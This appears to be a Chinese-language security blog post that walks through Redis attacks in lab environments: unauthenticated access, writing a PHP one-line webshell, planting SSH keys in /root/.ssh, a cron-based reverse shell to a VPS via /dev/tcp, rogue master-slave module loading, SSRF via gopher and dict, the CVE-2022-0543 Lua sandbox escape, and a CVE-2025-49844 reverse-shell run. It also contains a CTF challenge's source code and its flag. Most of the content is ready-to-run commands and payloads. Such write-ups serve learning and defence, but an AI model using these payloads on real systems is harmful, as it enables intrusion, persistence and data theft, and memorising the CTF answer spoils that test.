---
title: Redis 相关漏洞
date: 2026-08-15 12:10:00
categories:
  - Web安全
tags:
  - Redis
description: Redis 相关漏洞
---

Redis 是一个高性能的key-value数据库

启动redis

```
redis-server redis.conf
```

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212151116249.png "null")

如图所示，此时默认端口为6379，没用密码，这时候会导致未授权访问。

## 1.Redis未授权访问

#### 漏洞原理

Redis默认情况下，会绑定在**0.0.0.0:6379**，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果**没有设置密码认证**（一般为空）的情况下，会导致任意用户可以访问目标服务器下**未授权访问Redis以及读取Redis数据**。

#### 漏洞复现

复现环境：

kali2020(安装有redis3.2.0）

kali2021(安装有redis4.0.8）

编辑redis配置文件redis.conf：

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/1632050332_61471c9cb597b2f06e5a3.png!small "null")

前面加上#号，去掉IP绑定，允许除本地外的主机登陆redis服务：

修改protected-mode为no，关闭保护模式，允许远程连接redis服务，protected-mode是Redis3.2版本新增的安全配置项，开启后要求需要配置bind ip或者设置访问密码，关闭后是允许远程连接：

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/1632050090_61471baa6881559b8fd3b.png!small "null")

重新启动redis

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212164118286.png "null")

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212164453462.png "null")

## 2.redis写入webshell

#### 漏洞原理

靶机的redis存在未授权访问，并且**开启了web服务**，**知道了web目录的路径，****并具有文件****读写增删改查的权限**，即可通过redis在指定的web目录下**写入一句话木马**，用菜刀连接可达到控制服务器的目的。

#### 漏洞复现

靶机开启web服务，这里开启apache服务：

```
/etc/init.d/apache2 start
```

在攻击机上执行下列命令（执行顺序可以打乱）：

```
config set dir /var/www/html/ 
//切换到网站的根目录
config set dbfilename zcc.php
//在磁盘中生成木马文件
set xxx "\n\n\n<?php @eval($_POST['zcc']);?>\n\n\n" 
//写入恶意代码到内存中，这里的\n\n\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行.
save
//将内存中的数据导出到磁盘
```

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212164735459.png "null")

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212164845999.png "null")

蚁剑测试：

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212165126962.png "null")

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212165208072.png "null")

## 3.redis密钥登录ssh

#### 漏洞原理

在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。

#### 漏洞复现

**利用条件**：redis**对外开放**，且是**未授权访问状态**，并且**redis服务ssh对外开放**，可以通过key登入。

靶机开启ssh服务：

```
/etc/init.d/ssh start
```

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212170258358.png "null")

攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212170610410.png "null")

将公钥导入key.txt，这里将密钥开头和结尾添加了一些\n是用于防止乱码；

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212174812844.png "null")

将生成的公钥写入靶机服务器的内存之中

```
cat key.txt | redis-cli -h [ip] -x set xxx
// -x 代表从标准输入读取数据作为该命令的最后一个参数
```

在进入Redis服务器，发现公钥成功写入靶机服务器的内存之中，可以读取

![](/img/ctf/redis-vulns-013.png)

设置路径和保存的文件名，将内存变量导入磁盘文件

```
config set dir /root/.ssh
config set dbfilename authorized_keys
save
```

注意：靶机没有这个文件目录， 原因是.ssh 是记录密码信息的文件夹，如果没有用**root用户登录**过的话，就没有 .ssh 文件夹，所以我们在靶机上执行下面这条命令即可（也可以手动创建.ssh目录）

```
ssh localhost
```

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212175942167.png "null")

再设置路径和保存的文件名，将内存变量导入磁盘文件

```
config set dir /root/.ssh
config set dbfilename authorized_keys
save
```

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212180139125.png "null")

靶机这边也成功写入

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212180301682.png "null")

此时，在攻击机这里用ssh连接靶机，可成功连接

```
ssh -i id_rsa root@192.168.190.128
或者
ssh 192.168.190.128
```

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251212180631868.png "null")

## 4.利用计划任务反弹shell

(利用Crontab计划任务反弹Shell)

crontab :主要是用来定时执行某些任务，如果我们把一些命令放入指定文件里面，那么程序会定时去执行，相当于是每隔一段时间**自动执行命令**，不用担心当我们关闭会话或者目标主机关机，这个对我们后期**持久化渗透**是很有帮助的。

#### 漏洞原理

利用Redis**未授权**漏洞，可以通过**写入文件**到**系统计划任务目录 /var/spool/cron**下来执行。

#### 利用限制

反弹shell这里只在centos中能够利用成功，ubuntu，kali系统由于通过redis写入计划任务后乱码原因导致无法反弹成功

#### 漏洞复现

在Centos7系统的VPS上执行Redis的安装并进行未授权访问(靶机)

```
第零步 yum install -y gcc
第一步 wget http://download.redis.io/releases/redis-2.8.17.tar.gz #下载redis
第二步 tar -zxvf redis-2.8.17.tar.gz #解压安装包
第三步 cd redis-2.8.17 #进入redis文件夹
第四步 make #在redis-2.8.17文件夹下执行make
第五步cd src
第六步 ./redis-server ../redis.conf #使用上级/目录下的reids.conf文件中的配置启动redis服务
第七步 systemctl stop firewalld #关闭防火墙
```

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251214203613068.png "null")

执行以下命令进行反弹Shell

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251214212932426.png "null")

## 5.远程主从复制RCE_

#### 漏洞原理

漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。

#### 漏洞复现

redis-rogue-server工具下载地址：https://github.com/n0b0dyCN/redis-rogue-server

该工具无法对Redis密码进行Redis认证，也就是说该工具**只适合目标存在Redis未授权访问漏洞**时使用。

如果存在密码可以使用这个工具:

Awsome-Redis-Rogue-Server工具下载地址：https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216173655323.png "null")

执行反弹

攻击机：kali 192.168.186.139

靶机：ubuntu 192.168.186.128 (rhost) (开启redis 4.0.8 服务)

```
python3 redis_rogue_server.py -rhost 192.168.186.128 -lhost 192.168.186.139 -rport 6379 -lport 15000 
```

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216182300704.png "null")

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216182403035.png "null")

选择交互式的shell(interactive shell) 或者反弹shell(reserve shell)，这里选择的是交互式；若是选择反弹的如下（kali本机测试）：

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216183007515.png "null")

这部分的缺点就是只适用于目标机器允许远程登录的时候，如果目标机子只允许本地登录，则这种利用方法就不行了，此时可以配合其他漏洞，从目标本地登录redis。

## 6.本地Redis主从复制RCE反弹shell

#### 漏洞原理

对于**只允许本地连接的Redis服务器**，可以通过**开启主从模式**从远程主机上**同步恶意.so文件至本地**，接着载入恶意.so文件模块，反弹shell至远程主机。

#### 漏洞复现

这里将redis-rogue-server-master的exp.so复制到Awsome-Redis-Rogue-Server的目录下使用，因为exp.so带system模块

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216183910052.png "null")

kali开启监听，接受会话的反弹

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216184014093.png "null")

开启15000端口的主服务器

```
python3 redis_rogue_server.py -v -path exp.so
//-v      #冗余模式，仅启动Rouge Server模式
```

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216184721024.png "null")

靶机本机登录redis开启主从模式

```
redis-cli
```

查看是否存在模块，可以看见目前没有可用模块

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/1632050145_61471be10ebcd347b63b5.png!small "null")

进行主从同步，将恶意so文件写入到tmp目录

```
config set dir /tmp
//一般tmp目录都有写权限，所以选择这个目录写入
config set dbfilename exp.so
//设置导出文件的名字
slaveof 192.168.190.128 15000
//进行主从同步，将恶意so文件写入到tmp目录
```

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216184953106.png "null")

可以看见主服务器上FULLRESYNC全局同步数据中...

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216185040777.png "null")

加载写入的恶意so文件模块

```
module load ./exp.so 
//加载写入的恶意so文件模块
module list
//查看恶意so有没有加载成功，主要看有没有“system”
```

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216185255055.png "null")

可以看见加载成功

反弹shell：

```
system.rev 192.168.186.139 1234
```

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216185335886.png "null")

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216185436923.png "null")

关闭主从模式

```
slaveof NO ONE
```

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/1632050377_61471cc93d6f62e781abe.png!small "null")

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216185655212.png "null")

## 7.SSRF+Redis写入WebShell

#### 漏洞原理：

当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击.

#### 前置知识：

相关协议，例如dict://协议和gother协议的使用

1.dict://协议

词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628  
利用dict协议可以**扫描开放的端口**，**探测指纹信息**，可以**攻击redis服务**

用法：

```
dict://ip:port/info
```

2.gopher://协议

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/2206031b2bb132e5581dc6e590249c23.png "null")

gopher协议：分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。

gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议

用法：

```
gopher://ip:port/_payload
```

#### 漏洞复现：

##### 环境搭建：

靶机：centos7 [ip] SSRF漏洞 开启redis服务器（4.0.8）

攻击机：kali 192.168.186.139

VPS: 47.80.4.89

靶机打开redis服务（`./redis-server ../redis.conf`）

并在靶机上搭建WEB环境，在网站根目录，放置存在SSRF漏洞的脚本；  
fetch_demo.php：

```
<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_GET['url']);
#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
curl_exec($ch);
curl_close($ch);
?>
```

然后访问漏洞环境：

http://[ip]/fetch_demo.php?url=http://www.baidu.com

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216202543507.png "null")

当访问 http://[ip]/fetch_demo.php?url=http://127.0.0.1/ ,发现url未对内部地址做过滤，存在SSRF漏洞

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216202715323.png "null")

探测redis默认端口6379：http://[ip]/fetch_demo.php?url=dict://127.0.0.1:6379/info

出现靶机上的redis服务信息

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216202839248.png "null")

##### SSRF攻击Redis：

###### 1.通过redis写入ssh公钥，获取操作系统权限；

当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。

首先在靶机中创建ssh公钥存放目录（一般是/root/.ssh)

`mkdir /root/.ssh`

靶机中开启redis服务

`redis-server ../etc/redis.conf`

在攻击机中生成ssh公钥和私钥，密码设置为空：

`ssh-keygen -t rsa`

进入.ssh目录,然后将生成的公钥写入 ceshi.txt 文件

`cd /root/.ssh`

`(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") >ceshi.txt`

然后在.ssh目录，可以看到ceshi.txt中已经保存了公钥:  
![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216203943974.png "null")

通过URL访问SSRF漏洞地址：http://[ip]/fetch_demo.php?url=

结合gother协议构造符合格式的paylod，从而模拟redis通信。

payload:

```
set  margin  "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPXsD2dKIK4u8NVt0n702dmwjMzM0TOFbuIGVqBO/CXUJs6a3X00Hn1MQgd4v/au1+2MsQUhWwmVjAYrZfo/hyzMLjjdbb8F5NQ/MuX+XCQPXr0OIMOIQ8uOJQEDvow/FF8YLlbp6u9iQlyRMSCQE3dDbfkt5TWPXGiQxIqTO8gTCSO/clat6zsnlJ9Gab14tlGpv78rlQ8lKCLrmLojknO+64ikwIXNB/iB4R0SYthRm9GLV07kK2ZM2QBjmO1YQxdfBelNIcgQLQqG0iCPX5nf4BdPEVwGnJJHpAo32DaTbPs5q9ABitImNR5d2sd6RhAsle63IixDVn1oIKiOClXWkeyRZViBE87hddRynKs23pW+ENDojXK/4A3j4V8rqsfRVearpIoAEK+hbm7UDT6y9Sf533cH/xfdY01u0YOAnnDvMNt8QYgsJE4PWbnxl35ogEk0VLbBnogvvnH+rWmkSAyxXQvMiLMiEAqGkhEIOHTsTSps/tQjMmbd3RhnM= root@luodameinv\n\n\n"
config set dir /root/.ssh/
config set dbfilename "authorized_keys"
save
```

//更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）并设置上传公钥的备份文件名字为authorized_keys,将一开始生成的SSH公钥，即ceshi.txt里面的内容写入authorized_keys文件中。

将以上命令构造成符合gother协议格式，且能够通过URL传输的格式来发送，需要经过如下步骤：

将payload进行**url编码**，**替换%0a为%0d%0a**，**然后再重复一次以上的两个步骤**，得到最终payload

(原因：替换回车换行为%0d%0a，HTTP包最后加%0d%0a`代表消息结束)

在kali浏览器中访问，读取ssh公钥

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251216204858889.png "null")

然后在攻击机上使用ssh免密登录靶机：（具体操作见上"redis密钥登录ssh"）

```
ssh -i id_rsa root@[ip]
```

###### 2.直接向Web目录中写webshell；

和上面同理：

paylaod:

```
set x "\n\n\n<?php @eval($_POST['redis']);?>\n\n\n"
config set dir /www/admin/localhost_80/wwwroot  
config set dbfilename shell.php
save
```

以上命令，实现了向网站根目录写入一句话木马shell.php的功能 dir视具体网站路径而定。

分别二次URL编码，期间替换%0a为%0d%0a，得到paylaod

访问之后

此时，靶机网站根目录已经成功写入了shell.php文件，再蚁剑连接

###### 3.linux计划任务执行命令反弹shell

redis下的payload:

```
set xxx "\n\n* * * * * bash -i>& /dev/tcp/VPS_ip/6666 0>&1\n\n"
config set dir /var/spool/cron
config set dbfilename root
save
```

//该命令实现了：创建一个/var/spool/cron目录下的root用户的定时任务，每一分钟执行一次反弹shell的命令。

分别进行二次URL编码，期间替换%0a为%0d%0a，并按照之前的方式构造得到最终的payload

VPS监听需要反弹shell的端口

直接访问paylaod，获得反弹shell

同时，查看靶机，可以看到写入的反弹shell的计划任务

## Redis Lua沙盒绕过命令执行（CVE-2022-0543）

Redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力。

Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象`package`，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。

#### 漏洞环境

执行如下命令启动一个使用Ubuntu源安装的Redis 5.0.7服务器：

```
docker compose up -d
```

服务启动后，我们可以使用`redis-cli -h your-ip`连接这个redis服务器。

#### 漏洞复现

我们借助Lua沙箱中遗留的变量`package`的`loadlib`函数来加载动态链接库`/usr/lib/x86_64-linux-gnu/liblua5.1.so.0`里的导出函数`luaopen_io`。在Lua中执行这个导出函数，即可获得`io`库，再使用其执行命令：

```
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
local io = io_l();
local f = io.popen("id", "r");
local res = f:read("*a");
f:close();
return res
```

值得注意的是，不同环境下的liblua库路径不同，你需要指定一个正确的路径。在我们Vulhub环境（Ubuntu fiocal）中，这个路径是`/usr/lib/x86_64-linux-gnu/liblua5.1.so.0`

连接redis，使用`eval`命令执行上述脚本：

```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

可见命令已成功执行：

![](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/1.png?raw=true "null")

#### 相关习题：[NewStar CTF 2024 Week_5] ez_redis（Redis Lua沙盒绕过命令执行）

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251217181206405.png "null")

扫目录

![](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251217181143506.png "null")

访问 www.zip，得到index.php

```
<?php
    include_once "./core.php";
?>
<html>
    <head></head>
    <link rel="stylesheet" href="/static/bulma.min.css" />
    <body>
        <div class="container card">
            <div class="card-content">
                <div class="columns">
                    <div class="column is-10">
                        <h1 class="title">Redis便携控制面板1.0</h1>
                <form method="post">
                    <div class="field">
                        <label class="label">命令</label>
                        <div class="control">
                            <textarea class="textarea" name="eval"><?=isset($_POST['eval'])?$_POST['eval']:'return "newstar is u";'?></textarea>
                    <div class="control">
                        <input class="button is-success" type="submit" value="submit">
                    </div>
                </form>
                <?php 
                    if(isset($_POST['eval'])){
                        $cmd = $_POST['eval'];
                        if(preg_match("/set|php/i",$cmd))
                        {
                            $cmd = 'return "u are not newstar";';
                        }
                        $example = new Redis();
                        $example->connect($REDIS_HOST);
                        $result = json_encode($example->eval($cmd));
                        echo '<h1 class="subtitle">结果</h1>';
                        echo "<pre>$result</pre>";
                    }
                ?>
            </div>
        </div>
        <br/>
        <div class="container card">
            <div class="card-content">
                <div class="columns">
                <div class="column is-10"><a href="Redis_php.zip" class="card-footer-item">由Redis5强力驱动 by Zacarx</a></div>
                               </div>
                <div class="content">
                    <ul>
                    <?php
                        for($i=0; $i<$_SESSION['history_cnt']; $i++){
                            echo "<li>".$_SESSION['history_'.$i]."</li>";
                        }
                    ?>
                    </ul>
                </div>
            </div>
        </div>
        </div>
    </body>
</html>
```

**代码审计**：过滤了set php

**利用**：Redis Lua沙盒绕过命令执行（CVE-2022-0543）

paylaod:

```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

由于这道题的网站执行的是 redis 命令

于是去掉外⾯的 eval 即可

```
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res
```

![](https://cdn.nlark.com/yuque/0/2026/png/58405159/1768709148771-094b4876-1fb1-437f-ada6-1af628d880c1.png "null")

flag{NeWSt@R-cTf_ZO2Ae80b0e88056}

## Redis Lua 引擎 Use-After-Free（CVE-2025-49844 / RediShell）

#### 漏洞简介

CVE-2025-49844（社区常称 RediShell）是 Redis **Lua 脚本引擎**垃圾回收相关路径中的 **Use-After-Free** 漏洞。官方安全公告指出：**已认证**的攻击者可通过精心构造的 Lua 脚本操纵垃圾回收并触发 UAF，进而**可能导致 RCE**

#### 影响版本

以下版本区间来自社区复现笔记与官方公告（以官方公告为准）：

|   |   |   |
|---|---|---|
|主版本线|受影响版本|安全版本|
|6.x|< 6.2.20|≥ 6.2.20|
|7.x|< 7.2.11|≥ 7.2.11|
|7.4.x|< 7.4.6|≥ 7.4.6|
|8.0.x|< 8.0.4|≥ 8.0.4|
|8.2.x|< 8.2.2|≥ 8.2.2|

### 复现步骤

#### 1）启动受影响版本

```
docker run -d -p 6379:6379 redis:8.2.1-alpine
```

#### 2）确认版本信息（证明在“受影响版本”）

```
redis-cli -h 127.0.0.1 -p 6379 -a 'ChangeMe_StrongPass' INFO server | grep redis_version
```

可见 `redis_version:8.2.1`。

#### 4）执行利用

##### **反弹 Shell**

先在攻击机监听：

```
nc -lvnp 4444
```

然后执行反弹：

```
uv run cve-2025-49844 --target-host 192.168.186.128 --target-port 6379 rshell -l 192.168.186.142 -p 4444
```

![](/img/ctf/redis-vulns-045.png)

攻击机监听端口  
![](/img/ctf/redis-vulns-046.png)

成功反弹得到目标 Redis 主机 Shell

---

参考文章：

[Redis漏洞大全~讲解最全的漏洞利用方法-CSDN博客](https://blog.csdn.net/weixin_67832625/article/details/141035683)

[Redis漏洞总结 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/289231.html)

[Redis 重大远程代码执行漏洞（CVE-2025-49844](https://cloud.tencent.com/developer/article/2574448))

[Redis内存释放后重用超危漏洞(CVE-2025-49844)：深度风险提示与防护指南-CSDN博客](https://blog.csdn.net/weixin_42376192/article/details/154918713)

[利用SSRF攻击Redis_ssrf打redis-CSDN博客](https://blog.csdn.net/LUOBIKUN/article/details/109190546)